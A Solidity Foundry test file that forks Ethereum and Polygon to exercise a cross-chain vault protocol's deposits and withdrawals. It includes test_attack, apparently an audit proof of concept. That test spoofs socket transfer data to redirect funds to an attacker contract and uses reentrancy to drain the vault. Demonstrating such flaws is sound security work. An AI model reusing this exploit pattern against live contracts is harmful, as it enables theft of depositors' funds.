// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

// Contracts
import {Attack} from "contracts/attack/Attack.sol";
import "contracts/types/socketTypes.sol";
import "contracts/types/lzTypes.sol";

// Test Utils
import {MockERC20} from "./mocks/MockERC20.sol";
import "./utils/BaseSetup.sol";

struct BuildAttackArgs {
    address attackingContract;
    address fromSrc;
    address toDst;
    address underlyingDstToken;
    uint256 targetVaultId;
    uint256 amount;
    uint256 msgValue;
    uint16 srcChainId;
    uint16 toChainId;
}

struct TestProtocolVars {
    Vm.Log[] logs;
    StateReq[] stateReqs;
    LiqRequest[] liqReqs;
    StateReq stateReq;
    LiqRequest liqReq;
    MockERC20 TARGET_VAULT;
    uint256 vault;
    uint256 amountsToDeposit;
    uint256 ETH_PAYLOAD_ID;
    uint256 POLY_PAYLOAD_ID;
    uint256 sharesBalanceBeforeWithdraw;
    uint256 amountsToWithdraw;
    address user;
    address vaultMock;
    address underlyingSrcToken;
    address underlyingDstToken;
    address payable fromSrc;
    address payable toDst;
}

struct TestAttackVars {
    Vm.Log[] logs;
    StateReq[] stateReqs;
    LiqRequest[] liqReqs;
    StateReq stateReq;
    LiqRequest liqReq;
    MockERC20 VICTIM_VAULT;
    uint256 victimVault;
    uint256 amountsToDeposit;
    uint256 ETH_PAYLOAD_ID;
    uint256 POLY_PAYLOAD_ID;
    uint256 sharesBalanceBeforeWithdraw;
    uint256 assetsToStealEachLoop;
    address vaultMock;
    address underlyingSrcToken;
    address underlyingDstToken;
    address payable fromSrc;
    address payable toDst;
}

contract BaseProtocolTest is BaseSetup {
    Attack internal attackETH;
    Attack internal attackPOLY;

    address internal alice = address(0x1);
    address internal bob = address(0x2);
    address internal carol = address(0x3);

    /// @dev reference for chain ids https://layerzero.gitbook.io/docs/technical-reference/mainnet/supported-chain-ids
    uint16 constant ETH = 101;
    uint16 constant POLY = 109;

    address constant ETH_lzEndpoint =
        0x66A71Dcef29A0fFBDBE3c6a460a3B5BC225Cd675;
    address constant POLY_lzEndpoint =
        0x3c2269811836af69497E5F486A85D7316753cf62;

    string ETHEREUM_RPC_URL = vm.envString("ETHEREUM_RPC_URL");
    string POLYGON_RPC_URL = vm.envString("POLYGON_RPC_URL");

    function setUp() public override {
        super.setUp();

        /// @dev Call deploy protocol with intended src and dst chains for simulation
        _deployProtocol(
            ETHEREUM_RPC_URL,
            POLYGON_RPC_URL,
            ETH_lzEndpoint,
            POLY_lzEndpoint,
            ETH,
            POLY
        );

        /// @dev deploy attacking contract on src and dst chain
        address payable ethSuperRouter = payable(
            getContract(ETH, "SuperRouter")
        );

        address payable polyStateHandler = payable(
            getContract(POLY, "StateHandler")
        );

        address payable polySuperDestination = payable(
            getContract(POLY, "SuperDestination")
        );

        address polyDAI = getContract(POLY, "DAI");

        address polyDAIVault = getContract(POLY, "DAIVault");

        vm.selectFork(FORKS[ETH]);
        vm.startPrank(deployer);

        attackETH = new Attack(
            ethSuperRouter,
            polyStateHandler,
            polySuperDestination,
            polyDAI,
            polyDAIVault
        );

        MockERC20 ethDAI = MockERC20(super.getContract(ETH, "DAI"));

        ethDAI.transfer(address(attackETH), milionTokensE18 / 100);

        vm.selectFork(FORKS[POLY]);

        attackPOLY = new Attack(
            ethSuperRouter,
            polyStateHandler,
            polySuperDestination,
            polyDAI,
            polyDAIVault
        );

        vm.stopPrank();
    }

    /*///////////////////////////////////////////////////////////////
                        Unit tests: Showcase
    //////////////////////////////////////////////////////////////*/

    function test_deposit() public {
        TestProtocolVars memory vars;

        vars.vault = 1; // should correspond to DAI vault
        vars.amountsToDeposit = 1000;
        vars.ETH_PAYLOAD_ID;
        vars.POLY_PAYLOAD_ID;
        vars.underlyingSrcToken = getContract(ETH, "DAI");
        vars.underlyingDstToken = getContract(POLY, "DAI");
        vars.user = users[0];

        vars.fromSrc = payable(getContract(ETH, "SuperRouter"));
        vars.toDst = payable(getContract(POLY, "SuperDestination"));

        /// @dev Create liqRequest and stateReq for a couple users to deposit in target vault
        (vars.stateReq, vars.liqReq) = _buildDepositCallData(
            vars.fromSrc,
            vars.toDst,
            vars.underlyingSrcToken,
            vars.vault,
            vars.amountsToDeposit,
            1 ether,
            ETH,
            POLY
        );

        vars.TARGET_VAULT = MockERC20(getContract(POLY, "DAI"));
        vm.selectFork(FORKS[POLY]);
        assertEq(
            vars.TARGET_VAULT.balanceOf(getContract(POLY, "SuperDestination")),
            0
        );

        _depositToVault(
            DepositArgs(
                vars.underlyingSrcToken,
                vars.fromSrc,
                vars.toDst,
                POLY_lzEndpoint,
                vars.user,
                vars.stateReq,
                vars.liqReq,
                vars.amountsToDeposit,
                ETH,
                POLY
            )
        );

        vm.selectFork(FORKS[POLY]);
        assertEq(
            vars.TARGET_VAULT.balanceOf(vars.toDst),
            vars.amountsToDeposit
        );

        /// @dev code block for updating state and syncing messages
        {
            unchecked {
                vars.POLY_PAYLOAD_ID++;
            }
            _updateState(vars.POLY_PAYLOAD_ID, vars.amountsToDeposit, POLY);

            vm.recordLogs();
            _processPayload(vars.POLY_PAYLOAD_ID, POLY);

            vars.logs = vm.getRecordedLogs();
            LayerZeroHelper(getContract(POLY, "LayerZeroHelper"))
                .helpWithEstimates(
                    ETH_lzEndpoint,
                    1000000, /// @dev This is the gas value to send - value needs to be tested and probably be lower
                    FORKS[ETH],
                    vars.logs
                );

            unchecked {
                vars.ETH_PAYLOAD_ID++;
            }
            _processPayload(vars.ETH_PAYLOAD_ID, ETH);
        }

        vm.selectFork(FORKS[ETH]);
        assertEq(
            SuperRouter(vars.fromSrc).balanceOf(vars.user, 1),
            vars.amountsToDeposit
        );

        vars.vaultMock = getContract(POLY, "DAIVault");
        vm.selectFork(FORKS[POLY]);
        assertEq(
            VaultMock(vars.vaultMock).balanceOf(vars.toDst),
            vars.amountsToDeposit
        );
    }

    function test_deposit_and_withdrawal() public {
        TestProtocolVars memory vars;

        vars.vault = 1; // should correspond to DAI vault
        vars.amountsToDeposit = 1000;
        vars.ETH_PAYLOAD_ID;
        vars.POLY_PAYLOAD_ID;
        vars.underlyingSrcToken = getContract(ETH, "DAI");
        vars.underlyingDstToken = getContract(POLY, "DAI");
        vars.user = users[0];

        vars.fromSrc = payable(getContract(ETH, "SuperRouter"));
        vars.toDst = payable(getContract(POLY, "SuperDestination"));

        /// @dev Create liqRequest and stateReq for a couple users to deposit in target vault
        (vars.stateReq, vars.liqReq) = _buildDepositCallData(
            vars.fromSrc,
            vars.toDst,
            vars.underlyingSrcToken,
            vars.vault,
            vars.amountsToDeposit,
            1 ether,
            ETH,
            POLY
        );

        vars.TARGET_VAULT = MockERC20(getContract(POLY, "DAI"));
        vm.selectFork(FORKS[POLY]);
        assertEq(
            vars.TARGET_VAULT.balanceOf(getContract(POLY, "SuperDestination")),
            0
        );

        _depositToVault(
            DepositArgs(
                vars.underlyingSrcToken,
                vars.fromSrc,
                vars.toDst,
                POLY_lzEndpoint,
                vars.user,
                vars.stateReq,
                vars.liqReq,
                vars.amountsToDeposit,
                ETH,
                POLY
            )
        );

        vm.selectFork(FORKS[POLY]);
        assertEq(
            vars.TARGET_VAULT.balanceOf(vars.toDst),
            vars.amountsToDeposit
        );

        /// @dev code block for updating state and syncing messages
        {
            unchecked {
                vars.POLY_PAYLOAD_ID++;
            }
            _updateState(vars.POLY_PAYLOAD_ID, vars.amountsToDeposit, POLY);

            vm.recordLogs();
            _processPayload(vars.POLY_PAYLOAD_ID, POLY);

            vars.logs = vm.getRecordedLogs();
            LayerZeroHelper(getContract(POLY, "LayerZeroHelper"))
                .helpWithEstimates(
                    ETH_lzEndpoint,
                    1000000, /// @dev This is the gas value to send - value needs to be tested and probably be lower
                    FORKS[ETH],
                    vars.logs
                );

            unchecked {
                vars.ETH_PAYLOAD_ID++;
            }
            _processPayload(vars.ETH_PAYLOAD_ID, ETH);
        }

        vm.selectFork(FORKS[ETH]);
        assertEq(
            SuperRouter(vars.fromSrc).balanceOf(vars.user, 1),
            vars.amountsToDeposit
        );

        vars.vaultMock = getContract(POLY, "DAIVault");
        vm.selectFork(FORKS[POLY]);
        assertEq(
            VaultMock(vars.vaultMock).balanceOf(vars.toDst),
            vars.amountsToDeposit
        );

        /// @dev Withdrawal -------------------------
        vm.selectFork(FORKS[ETH]);

        vars.sharesBalanceBeforeWithdraw = SuperRouter(vars.fromSrc).balanceOf(
            vars.user,
            1
        );
        vm.selectFork(FORKS[POLY]);

        vars.amountsToWithdraw = VaultMock(vars.vaultMock).previewRedeem(
            vars.sharesBalanceBeforeWithdraw
        );

        (vars.stateReq, vars.liqReq) = _buildWithdrawCallData(
            BuildWithdrawArgs(
                vars.fromSrc,
                vars.toDst,
                vars.underlyingSrcToken,
                vars.vault,
                vars.amountsToWithdraw,
                10 ether,
                ETH,
                POLY
            )
        );

        _withdrawFromVault(
            WithdrawArgs(
                vars.fromSrc,
                vars.toDst,
                POLY_lzEndpoint,
                vars.user,
                vars.stateReq,
                vars.liqReq,
                vars.amountsToWithdraw,
                ETH,
                POLY
            )
        );

        vars.POLY_PAYLOAD_ID++;
        _processPayload(vars.POLY_PAYLOAD_ID, POLY);
    }

    function test_attack_contract_same_address() public {
        assertEq(address(attackETH), address(attackPOLY));
    }

    /*///////////////////////////////////////////////////////////////
                        Unit tests: Attack
    //////////////////////////////////////////////////////////////*/

    /// @dev This is a test of an end to end possible attack. Testing individual parts (unit tests) can be taken from here
    function test_attack() public {
        TestAttackVars memory vars;

        vars.victimVault = 1; // should correspond to DAI vault
        vars.amountsToDeposit = 1000;
        vars.ETH_PAYLOAD_ID;
        vars.POLY_PAYLOAD_ID;
        vars.underlyingSrcToken = getContract(ETH, "DAI");
        vars.underlyingDstToken = getContract(POLY, "DAI");

        vars.fromSrc = payable(getContract(ETH, "SuperRouter"));
        vars.toDst = payable(getContract(POLY, "SuperDestination"));

        /// @dev Create liqRequest and stateReq for a couple users to deposit in target vault
        (vars.stateReq, vars.liqReq) = _buildDepositCallData(
            vars.fromSrc,
            vars.toDst,
            vars.underlyingSrcToken,
            vars.victimVault,
            vars.amountsToDeposit,
            1 ether,
            ETH,
            POLY
        );

        vars.VICTIM_VAULT = MockERC20(getContract(POLY, "DAI"));
        vm.selectFork(FORKS[POLY]);
        assertEq(
            vars.VICTIM_VAULT.balanceOf(getContract(POLY, "SuperDestination")),
            0
        );

        /// @dev fund the vault with 10000 DAI
        for (uint256 i = 0; i < users.length; i++) {
            _depositToVault(
                DepositArgs(
                    vars.underlyingSrcToken,
                    vars.fromSrc,
                    vars.toDst,
                    POLY_lzEndpoint,
                    users[i],
                    vars.stateReq,
                    vars.liqReq,
                    vars.amountsToDeposit,
                    ETH,
                    POLY
                )
            );
        }

        vm.selectFork(FORKS[POLY]);
        assertEq(
            vars.VICTIM_VAULT.balanceOf(vars.toDst),
            vars.amountsToDeposit * users.length
        );

        /// @dev Update state on src and dst and process payload on dst
        /// @notice this will mint to the users the super positions
        for (uint256 i = 0; i < users.length; i++) {
            unchecked {
                vars.POLY_PAYLOAD_ID++;
            }
            _updateState(vars.POLY_PAYLOAD_ID, vars.amountsToDeposit, POLY);

            vm.recordLogs();
            _processPayload(vars.POLY_PAYLOAD_ID, POLY);

            vars.logs = vm.getRecordedLogs();
            LayerZeroHelper(getContract(POLY, "LayerZeroHelper"))
                .helpWithEstimates(
                    ETH_lzEndpoint,
                    1000000, /// @dev This is the gas value to send - value needs to be tested and probably be lower
                    FORKS[ETH],
                    vars.logs
                );

            unchecked {
                vars.ETH_PAYLOAD_ID++;
            }

            _processPayload(vars.ETH_PAYLOAD_ID, ETH);

            vm.selectFork(FORKS[ETH]);
            assertEq(
                SuperRouter(vars.fromSrc).balanceOf(users[i], 1),
                vars.amountsToDeposit
            );
        }

        vars.vaultMock = getContract(POLY, "DAIVault");
        vm.selectFork(FORKS[POLY]);
        assertEq(
            VaultMock(vars.vaultMock).balanceOf(vars.toDst),
            vars.amountsToDeposit * users.length
        );

        /// @dev Step 1 - deposit from the source attacker contract
        /// @dev Attack starts from the attacking contract which is the 'user'
        /// @dev Notice no parameters are changed here from the same kind of requests the other users did
        vars.stateReqs = new StateReq[](1);
        vars.liqReqs = new LiqRequest[](1);

        vars.stateReqs[0] = vars.stateReq;
        vars.liqReqs[0] = vars.liqReq;

        vm.selectFork(FORKS[ETH]);
        vm.prank(deployer);
        attackETH.depositIntoRouter{value: 2 ether}(
            vars.liqReqs,
            vars.stateReqs
        );
        vars.logs = vm.getRecordedLogs();
        LayerZeroHelper(getContract(ETH, "LayerZeroHelper")).helpWithEstimates(
            POLY_lzEndpoint,
            1000000, /// @dev This is the gas value to send - value needs to be tested and probably be lower
            FORKS[POLY],
            vars.logs
        );

        vars.POLY_PAYLOAD_ID++;
        _updateState(vars.POLY_PAYLOAD_ID, vars.amountsToDeposit, POLY);

        _processPayload(vars.POLY_PAYLOAD_ID, POLY);

        vars.logs = vm.getRecordedLogs();
        LayerZeroHelper(getContract(POLY, "LayerZeroHelper")).helpWithEstimates(
                ETH_lzEndpoint,
                1000000, /// @dev This is the gas value to send - value needs to be tested and probably be lower
                FORKS[ETH],
                vars.logs
            );

        vars.ETH_PAYLOAD_ID++;
        _processPayload(vars.ETH_PAYLOAD_ID, ETH);
        vars.sharesBalanceBeforeWithdraw = SuperRouter(vars.fromSrc).balanceOf(
            address(attackETH),
            1
        );
        assertEq(vars.sharesBalanceBeforeWithdraw, vars.amountsToDeposit);

        /// @dev Step 2 - Attacker previews how many assets he will be stealing from the vault in each reentrancy
        // Specifically he could choose to do  BscVaultBalanceAtBeginningOfAttack/sharesBalanceBeforeWithdraw (rounded down) reentrancies

        vm.selectFork(FORKS[POLY]);

        vars.assetsToStealEachLoop = VaultMock(vars.vaultMock).previewRedeem(
            vars.sharesBalanceBeforeWithdraw
        );

        /// @dev Create liqRequest and stateReq for a couple users to deposit in target vault
        (vars.stateReq, vars.liqReq) = _buildWithdrawAttackCallData(
            BuildAttackArgs(
                address(attackPOLY),
                vars.fromSrc,
                vars.toDst,
                vars.underlyingSrcToken,
                vars.victimVault,
                vars.amountsToDeposit,
                10 ether,
                ETH,
                POLY
            )
        );
        vars.stateReqs[0] = vars.stateReq;
        vars.liqReqs[0] = vars.liqReq;
        /// @dev airdrop 99 ETH to socket in both chain
        vm.startPrank(deployer);

        vm.selectFork(FORKS[ETH]);
        payable(getContract(ETH, "SocketRouterMockFork")).transfer(99 ether);

        vm.selectFork(FORKS[POLY]);
        payable(getContract(POLY, "SocketRouterMockFork")).transfer(99 ether);

        vm.stopPrank();

        /// @dev Step 3 - A normal withdrawal from the SourceChain is inititated by the attacker contract
        /// @dev This chain is where the SuperPositions are stored
        vm.selectFork(FORKS[ETH]);
        vm.prank(deployer);
        attackETH.withdrawFromRouter{value: 10 ether}(
            vars.liqReqs,
            vars.stateReqs
        );
        vars.logs = vm.getRecordedLogs();
        LayerZeroHelper(getContract(ETH, "LayerZeroHelper")).helpWithEstimates(
            POLY_lzEndpoint,
            1000000, /// @dev This is the gas value to send - value needs to be tested and probably be lower
            FORKS[POLY],
            vars.logs
        );

        /// @dev Step 4 - Reentrancy
        vars.POLY_PAYLOAD_ID++;
        _processPayload(vars.POLY_PAYLOAD_ID, POLY);

        vm.selectFork(FORKS[POLY]);
        /// @dev WARNING - Asserts vault in polygon has been drained
        assertEq(VaultMock(vars.vaultMock).balanceOf(vars.toDst), 0);
    }

    function _buildWithdrawAttackCallData(BuildAttackArgs memory args)
        internal
        view
        returns (StateReq memory stateReq, LiqRequest memory liqReq)
    {
        /// @dev set to empty bytes for now
        bytes memory adapterParam;

        /// @dev only testing 1 vault at a time for now
        uint256[] memory amountsToDeposit = new uint256[](1);
        uint256[] memory targetVaultIds = new uint256[](1);
        uint256[] memory slippage = new uint256[](1);

        amountsToDeposit[0] = args.amount;
        targetVaultIds[0] = args.targetVaultId;
        slippage[0] = 1000;

        stateReq = StateReq(
            args.toChainId,
            amountsToDeposit,
            targetVaultIds,
            slippage,
            adapterParam,
            args.msgValue
        );

        /// @dev ! Notice - A new mock functon mockSocketTransferNative was added to the socket contract to allow this
        /// @dev ! Notice - This is valid because socket allows swaps between Token -> Native Currency in the same destination chain
        /// @dev ! Notice - without breaking the chain of call (DEX Swap)
        bytes memory spoofedTxData = abi.encodeWithSignature(
            "mockSocketTransferNative(address,address,address,uint256,uint256)",
            args.toDst,
            args.attackingContract, /// @dev <--- Attacker contract address in the destination chain replaces the destination of the socket transfer.
            args.underlyingDstToken,
            args.amount,
            FORKS[args.toChainId]
        );

        liqReq = LiqRequest(
            1,
            spoofedTxData,
            args.underlyingDstToken,
            getContract(args.srcChainId, "SocketRouterMockFork"),
            args.amount,
            0
        );
    }
}
